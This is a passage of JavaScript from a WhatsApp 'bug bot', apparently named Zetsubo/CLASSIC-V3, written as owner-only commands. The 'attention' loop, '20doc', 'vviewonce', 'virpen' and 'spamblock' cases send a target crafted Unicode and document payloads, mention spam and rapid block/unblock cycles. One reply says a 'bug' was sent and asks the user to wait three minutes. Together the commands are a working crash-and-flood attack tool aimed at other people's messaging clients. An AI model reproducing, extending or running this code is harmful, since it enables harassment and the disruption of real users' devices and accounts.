attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ𝅛私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入𝅛ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ𝅛私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ𝅛私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
attention(`⛅⃟導入ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ私⃟🌤️${restugay}${ios1}.${ios2}`)
await sleep(1000) 
}
zetsreply(`*Sukses mengirim Bug Ke ${Pe} Tolong Jeda 3 Menit Yah*`)
}
break
case 'vviewonce':{
if (!isCreator) return m.reply(`*Only Premium Members Are Allowed To Use This Command*`)
zetsubo.sendMessage(from, { image: { url: "https://telegra.ph/file/d85150f523b0ea2a1568a.jpg" },viewOnce : true, caption: `${bugcapt}` }, { quoted: kalgans })
await sleep(800)
zetsubo.sendMessage(from, { image: { url: "https://telegra.ph/file/d85150f523b0ea2a1568a.jpg" },viewOnce : true, caption: `${bugcapt}` }, { quoted: kalgans })
await sleep(800)
zetsubo.sendMessage(from, { image: { url: "https://telegra.ph/file/d85150f523b0ea2a1568a.jpg" },viewOnce : true, caption: `${bugcapt}` }, { quoted: kalgans })
await sleep(800)
zetsubo.sendMessage(from, { image: { url: "https://telegra.ph/file/d85150f523b0ea2a1568a.jpg" },viewOnce : true, caption: `${bugcapt}` }, { quoted: kalgans })
await sleep(800)
zetsubo.sendMessage(from, { image: { url: "https://telegra.ph/file/d85150f523b0ea2a1568a.jpg" },viewOnce : true, caption: `${bugcapt}` }, { quoted: kalgans })
await sleep(800)
}
break
case '20doc':{
if (!isCreator) return m.reply(`*Only Premium Members Are Allowed To Use This Command*`)
await loading()
jumlah = `20`
for (let i = 0; i < jumlah; i++) {
var document = generateWAMessageFromContent(from, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "༐⫹⸙⧉𝐂𝐋𝐀𝐒𝐒𝐈𝐂-𝐕3 𝐁𝐔𝐆 𝐁𝐎𝐓⧉⸙⫺༔༐༑",
"title": "༐༑⿻𝐒⸙𝐀࿈𝐌𖤓𝐕𝐢𝐒𝐢𝐎𝐍⿻༔༐༑",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `Zetsubo - Console V1.${ios1}`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
"caption":` ༐༑⿻𝐒⸙𝐀࿈𝐌𖤓𝐕𝐢𝐒𝐢𝐎𝐍⿻༔༐༑.${buttonkal}`,
}
}), { userJid: from, quoted:kalgans})
zetsubo.relayMessage(from, document.message, { messageId: document.key.id })
}
}
break
case 'virpen': {
if (!isCreator) return m.reply(`*Only Premium Members Are Allowed To Use This Command*`)
await loading()
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
zetsubo.sendMessage(from, { text: `༐༑⿻𝐒⸙𝐀࿈𝐌➟𝐕𝐢͢𝐒𝐢𝐎͢𝐍⿻༔༐༑${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
zetsubo.sendMessage(from, { text: `⿻ 𒑰𝐒⸙𝐀࿈𝐌 - 𝟕𝐆͢𝛉𝐃 - 𝟎𝐩 ${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
await sleep(900)
zetsubo.sendMessage(from, { text: `༐༑⿻𝐒⸙𝐀࿈𝐌➟➟𝐕𝐢͢𝐒𝐢𝐎͢𝐍⿻༔༐༑${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
zetsubo.sendMessage(from, { text: `⿻ 𒑰𝐒⸙𝐀࿈𝐌 - 𝟕𝐆͢𝛉𝐃 - 𝟎𝐩 ${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
await sleep(900)
zetsubo.sendMessage(from, { text: `༐༑⿻𝐒⸙𝐀࿈𝐌➟𝐕𝐢͢𝐒𝐢𝐎͢𝐍⿻༔༐༑${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
zetsubo.sendMessage(from, { text: `⿻ 𒑰𝐒⸙𝐀࿈𝐌 - 𝟕𝐆͢𝛉𝐃 - 𝟎𝐩 ${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
await sleep(900)
zetsubo.sendMessage(from, { text: `༐༑⿻𝐒⸙𝐀࿈𝐌➟𝐕𝐢͢𝐒𝐢𝐎͢𝐍⿻༔༐༑${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
zetsubo.sendMessage(from, { text: `⿻ 𒑰𝐒⸙𝐀࿈𝐌 - 𝟕𝐆͢𝛉𝐃 - 𝟎𝐩 ${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
await sleep(900)
zetsubo.sendMessage(from, { text: `༐༑⿻𝐒⸙𝐀࿈𝐌➟𝐕𝐢͢𝐒𝐢𝐎͢𝐍⿻༔༐༑${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
zetsubo.sendMessage(from, { text: `⿻ 𒑰ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ ${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
await sleep(900)
zetsubo.sendMessage(from, { text: `༐༑⿻⧠ 𝐒⸙𝐀࿈𝐌 ❖ 𝐕𝐈𝐒𝐈𝐎𝐍 ⧠⿻༔༐༑${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
zetsubo.sendMessage(from, { text: `⿻ 𒑰ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
await sleep(900)
zetsubo.sendMessage(from, { text: `༐༑⿻⧠ 𝐒⸙𝐀࿈𝐌 ❖ 𝐕𝐈𝐒𝐈𝐎𝐍 ⧠⿻༔༐༑${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
zetsubo.sendMessage(from, { text: `⿻ 𒑰ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ ${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
await sleep(900)
zetsubo.sendMessage(from, { text: `༐༑⿻⧠ 𝐒⸙𝐀࿈𝐌 ❖ 𝐕𝐈𝐒𝐈𝐎𝐍 ⧠⿻༔༐༑${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
zetsubo.sendMessage(from, { text: `⿻ 𒑰ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ ${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
await sleep(900)
zetsubo.sendMessage(from, { text: `༐༑⿻𝐒⸙𝐀࿈𝐌͢.𝐕➟𝐕𝐢͢𝐒𝐢𝐎͢𝐍⿻༔༐༑${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
zetsubo.sendMessage(from, { text: `⿻ 𒑰ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ ${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
await sleep(900)
zetsubo.sendMessage(from, { text: `༐༑⿻𝐒⸙𝐀࿈𝐌͢.𝐕➟𝐕𝐢͢𝐒𝐢𝐎͢𝐍⿻༔༐༑${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
zetsubo.sendMessage(from, { text: `⿻ 𒑰ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ ${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
await sleep(900)
zetsubo.sendMessage(from, { text: `༐༑⿻𝐒⸙𝐀࿈𝐌͢.𝐕➟𝐕𝐢͢𝐒𝐢𝐎͢𝐍⿻༔༐༑${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
zetsubo.sendMessage(from, { text: `⿻ 𒑰ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ ${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
await sleep(900)
zetsubo.sendMessage(from, { text: `༐༑⿻𝐒⸙𝐀࿈𝐌͢.𝐕➟𝐕𝐢͢𝐒𝐢𝐎͢𝐍⿻༔༐༑${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
zetsubo.sendMessage(from, { text: `⿻ 𒑰ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ ${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
await sleep(900)
zetsubo.sendMessage(from, { text: `༐༑⿻𝐒⸙𝐀࿈𝐌͢.𝐕➟𝐕𝐢͢𝐒𝐢𝐎͢𝐍⿻༔༐༑${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
zetsubo.sendMessage(from, { text: `⿻ 𒑰ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ ${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
await sleep(900)
zetsubo.sendMessage(from, { text: `༐༑⿻𝐒⸙𝐀࿈𝐌͢.𝐕➟𝐕𝐢͢𝐒𝐢𝐎͢𝐍⿻༔༐༑${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
zetsubo.sendMessage(from, { text: `⿻ 𒑰ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ ${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
await sleep(900)
zetsubo.sendMessage(from, { text: `༐༑⿻𝐒⸙𝐀࿈𝐌͢.𝐕➟𝐕𝐢͢𝐒𝐢𝐎͢𝐍⿻༔༐༑${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
zetsubo.sendMessage(from, { text: `⿻ 𒑰ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ ${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
await sleep(900)
zetsubo.sendMessage(from, { text: `༐༑⿻𝐒⸙𝐀࿈𝐌͢.𝐕➟𝐕𝐢͢𝐒𝐢𝐎͢𝐍⿻༔༐༑${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
zetsubo.sendMessage(from, { text: `⿻ 𒑰ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ ${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
await sleep(900)
zetsubo.sendMessage(from, { text: `༐༑⿻𝐒⸙𝐀࿈𝐌͢.𝐕➟𝐕𝐢͢𝐒𝐢𝐎͢𝐍⿻༔༐༑${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
zetsubo.sendMessage(from, { text: `⿻ 𒑰ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ ${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
await sleep(900)
zetsubo.sendMessage(from, { text: `༐༑⿻𝐒⸙𝐀࿈𝐌͢.𝐕➟𝐕𝐢͢𝐒𝐢𝐎͢𝐍⿻༔༐༑${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
zetsubo.sendMessage(from, { text: `⿻ 𒑰ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ ${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
await sleep(900)
zetsubo.sendMessage(from, { text: `༐༑⿻𝐒⸙𝐀࿈𝐌͢.𝐕➟𝐕𝐢͢𝐒𝐢𝐎͢𝐍⿻༔༐༑${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
zetsubo.sendMessage(from, { text: `⿻ 𒑰ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ ${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
await sleep(900)
zetsubo.sendMessage(from, { text: `༐༑⿻𝐒⸙𝐀࿈𝐌͢.𝐕➟𝐕𝐢͢𝐒𝐢𝐎͢𝐍⿻༔༐༑${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
zetsubo.sendMessage(from, { text: `⿻ 𒑰ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ ${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
await sleep(900)
zetsubo.sendMessage(from, { text: `༐༑⿻𝐒⸙𝐀࿈𝐌͢.𝐕➟𝐕𝐢͢𝐒𝐢𝐎͢𝐍⿻༔༐༑${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
zetsubo.sendMessage(from, { text: `⿻ 𒑰ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ ${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
await sleep(900)
zetsubo.sendMessage(from, { text: `༐༑⿻𝐒⸙𝐀࿈𝐌͢.𝐕➟𝐕𝐢͢𝐒𝐢𝐎͢𝐍⿻༔༐༑${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
zetsubo.sendMessage(from, { text: `⿻ 𒑰ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ ${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
await sleep(900)
zetsubo.sendMessage(from, { text: `༐༑⿻𝐒⸙𝐀࿈𝐌͢.𝐕➟𝐕𝐢͢𝐒𝐢𝐎͢𝐍⿻༔༐༑${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
zetsubo.sendMessage(from, { text: `⿻ 𒑰ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ ${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
await sleep(900)
zetsubo.sendMessage(from, { text: `༐༑⿻𝐒⸙𝐀࿈𝐌͢.𝐕➟𝐕𝐢͢𝐒𝐢𝐎͢𝐍⿻༔༐༑${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
zetsubo.sendMessage(from, { text: `⿻ 𒑰ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ ${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
await sleep(900)
zetsubo.sendMessage(from, { text: `༐༑⿻𝐒⸙𝐀࿈𝐌͢.𝐕➟𝐕𝐢͢𝐒𝐢𝐎͢𝐍⿻༔༐༑${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
zetsubo.sendMessage(from, { text: `⿻ 𒑰ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ ${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
await sleep(900)
zetsubo.sendMessage(from, { text: `༐༑⿻𝐒⸙𝐀࿈𝐌͢.𝐕➟𝐕𝐢͢𝐒𝐢𝐎͢𝐍⿻༔༐༑${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
zetsubo.sendMessage(from, { text: `⿻ 𒑰ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ ${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
await sleep(900)
zetsubo.sendMessage(from, { text: `༐༑⿻𝐒⸙𝐀࿈𝐌͢.𝐕➟𝐕𝐢͢𝐒𝐢𝐎͢𝐍⿻༔༐༑${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
zetsubo.sendMessage(from, { text: `⿻ 𒑰ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ ${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
await sleep(900)
zetsubo.sendMessage(from, { text: `༐༑⿻𝐒⸙𝐀࿈𝐌͢.𝐕➟𝐕𝐢͢𝐒𝐢𝐎͢𝐍⿻༔༐༑${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
zetsubo.sendMessage(from, { text: `⿻ 𒑰ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ ${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
await sleep(900)
zetsubo.sendMessage(from, { text: `༐༑⿻𝐒⸙𝐀࿈𝐌͢.𝐕➟𝐕𝐢͢𝐒𝐢𝐎͢𝐍⿻༔༐༑${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
zetsubo.sendMessage(from, { text: `⿻ 𒑰ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ ${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
await sleep(900)
zetsubo.sendMessage(from, { text: `༐༑⿻𝐒⸙𝐀࿈𝐌͢.𝐕➟𝐕𝐢͢𝐒𝐢𝐎͢𝐍⿻༔༐༑${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
zetsubo.sendMessage(from, { text: `⿻ 𒑰ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ ${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
await sleep(900)
zetsubo.sendMessage(from, { text: `༐༑⿻𝐒⸙𝐀࿈𝐌͢.𝐕➟𝐕𝐢͢𝐒𝐢𝐎͢𝐍⿻༔༐༑${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
zetsubo.sendMessage(from, { text: `⿻ 𒑰ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ ${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
await sleep(900)
zetsubo.sendMessage(from, { text: `༐༑⿻𝐒⸙𝐀࿈𝐌͢.𝐕➟𝐕𝐢͢𝐒𝐢𝐎͢𝐍⿻༔༐༑${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
zetsubo.sendMessage(from, { text: `⿻ 𒑰ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ ${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
await sleep(900)
zetsubo.sendMessage(from, { text: `༐༑⿻𝐒⸙𝐀࿈𝐌͢.𝐕➟𝐕𝐢͢𝐒𝐢𝐎͢𝐍⿻༔༐༑${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
zetsubo.sendMessage(from, { text: `⿻ 𒑰ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ ${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
await sleep(900)
zetsubo.sendMessage(from, { text: `༐༑⿻𝐒⸙𝐀࿈𝐌͢.𝐕➟➟𝐕𝐢͢𝐒𝐢𝐎͢𝐍⿻༔༐༑${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
zetsubo.sendMessage(from, { text: `⿻ 𒑰ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ ${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
await sleep(900)
zetsubo.sendMessage(from, { text: `༐༑⿻𝐒⸙𝐀࿈𝐌͢.𝐕➟➟𝐕𝐢͢𝐒𝐢𝐎͢𝐍⿻༔༐༑${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
zetsubo.sendMessage(from, { text: `⿻ 𒑰ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ ${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
await sleep(900)
zetsubo.sendMessage(from, { text: `༐༑⿻𝐒⸙𝐀࿈𝐌͢.𝐕➟𝐕𝐢͢𝐒𝐢𝐎͢𝐍⿻༔༐༑${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
zetsubo.sendMessage(from, { text: `⿻ 𒑰ᚘ𝐂𝐋⸙𝐀𝐒𝐒᪣𝐈𝐂-𝐕3ᚘ ${cttl}`, mentions: [`${jids1}`] }, {quoted:kalgans})
await sleep(900)
}}
break
case 'spamblock': {
if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
await loading()
bnnd = text.split(",")[0]+'@s.whatsapp.net'
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await sleep(800)
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
await zetsubo.updateBlockStatus(bnnd, 'block')
await zetsubo.updateBlockStatus(bnnd, 'unblock')
